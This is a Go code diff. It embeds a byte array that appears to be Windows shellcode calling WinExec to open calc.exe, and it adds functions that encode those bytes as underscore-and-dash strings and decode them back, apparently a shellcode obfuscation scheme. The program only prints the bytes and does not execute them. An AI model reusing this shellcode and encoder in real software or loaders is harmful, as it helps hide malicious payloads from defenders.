@@ -4,12 +4,32 @@ import (
 	"encoding/hex"
 	"fmt"
 	"strconv"
+	"strings"
 )
 
-func main() {
-	fmt.Println(Byte2BinStr([]byte{0x2F, 0xFF, 0x43, 0x90}))
+var sc = []byte{0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
+	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
+	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
+	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
+	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
+	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
+	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
+	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
+	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
+	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
+	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
+	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
+	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
+	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
+	0xd7,
+}
 
-	fmt.Printf("%x", BinStr2Byte(Byte2BinStr([]byte{0x2F, 0xFF, 0x43, 0x90})))
+func main() {
+	fmt.Println(Byte2BinStr(sc))
+
+	rev := BinStr2Byte(Byte2BinStr(sc))
+	fmt.Printf("%x\n", rev)
+
 }
 
 func BinStr2Byte(ss []string) []byte {
@@ -18,9 +38,9 @@ func BinStr2Byte(ss []string) []byte {
 	}
 	var ret []byte
 	for i := 0; i < len(ss); i += 2 {
-		ui, _ := strconv.ParseUint(ss[i], 2, 64)
+		ui, _ := strconv.ParseUint(translRe(ss[i]), 2, 64)
 		tmpstr := fmt.Sprintf("%x", ui)
-		ui, _ = strconv.ParseUint(ss[i+1], 2, 64)
+		ui, _ = strconv.ParseUint(translRe(ss[i+1]), 2, 64)
 		tmpstr += fmt.Sprintf("%x", ui)
 		btmp, _ := hex.DecodeString(tmpstr)
 		ret = append(ret, btmp[0])
@@ -32,34 +52,56 @@ func Byte2BinStr(b []byte) []string {
 	var ret []string
 	for _, v := range b {
 		str := fmt.Sprintf("%x", v)
+		if len(str) == 1 {
+			str = "0" + str
+		}
+
 		b0, _ := hex.DecodeString("0" + string(str[0]))
-		ret = append(ret, patch(strconv.FormatInt(int64(b0[0]), 2)))
+		ret = append(ret, transl(patch(strconv.FormatInt(int64(b0[0]), 2))))
 		b0, _ = hex.DecodeString("0" + string(str[1]))
 		strconv.FormatInt(int64(b0[0]), 2)
-		ret = append(ret, patch(strconv.FormatInt(int64(b0[0]), 2)))
+		ret = append(ret, transl(patch(strconv.FormatInt(int64(b0[0]), 2))))
 
 	}
 	return ret
 }
 
 func patch(s string) string {
-	switch s {
-	case "0":
+	switch len(s) {
+	case 1:
 		return "000" + s
-	case "1":
-		return "000" + s
-	case "10":
+	case 2:
 		return "00" + s
-	case "11":
-		return "00" + s
-	case "100":
-		return "0" + s
-	case "101":
-		return "0" + s
-	case "110":
-		return "0" + s
-	case "111":
+	case 3:
 		return "0" + s
 	}
 	return s
+}
+
+func transl(s string) string {
+	arr := strings.Split(s, "")
+	var tmp string
+	for _, v := range arr {
+		switch v {
+		case "0":
+			tmp += "_"
+		case "1":
+			tmp += "-"
+		}
+	}
+	return tmp
+}
+
+func translRe(s string) string {
+	arr := strings.Split(s, "")
+	var tmp string
+	for _, v := range arr {
+		switch v {
+		case "_":
+			tmp += "0"
+		case "-":
+			tmp += "1"
+		}
+	}
+	return tmp
 }
